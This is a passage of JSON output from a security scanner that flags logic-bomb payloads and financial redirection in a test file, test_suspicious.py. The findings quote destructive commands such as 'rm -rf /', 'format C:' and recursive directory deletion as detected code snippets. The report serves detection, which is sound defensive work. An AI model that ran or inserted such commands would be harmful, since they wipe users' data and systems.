      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.105321"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "shutil.rmtree('/important_data')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.108314",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "test_suspicious.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
      "id": "1e93ebb8-2cb0-4689-96f9-c27bd7747207",
      "last_modified": "",
      "line_number": 12,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T19:52:26.108314"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.system('format C:')",
      "column": 8,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.108314",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "test_suspicious.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
      "id": "3e73d1d7-9be2-4de8-b9e7-317c0d50ce9c",
      "last_modified": "",
      "line_number": 13,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "System formatting - Complete data destruction",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T19:52:26.108314"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "subprocess.call(['rm', '-rf', '/'])",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.108314",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "test_suspicious.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
      "id": "2eb1d590-47c0-4ca4-bb8d-90ce9d119a29",
      "last_modified": "",
      "line_number": 14,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T19:52:26.108314"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.remove('/critical_file.txt')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.108314",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "test_suspicious.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
      "id": "6a9417b2-969e-4dc3-b586-e9be10b13423",
      "last_modified": "",
      "line_number": 28,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "File/directory deletion - Data loss risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T19:52:26.108314"
    }
  ],
  "issues_found": 49,
  "project_id": "vscode-workspace-1754922146019",
  "quality_gate_status": "BLOCKED",
  "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
  "timestamp": "2025-08-11T19:52:26.031316"
}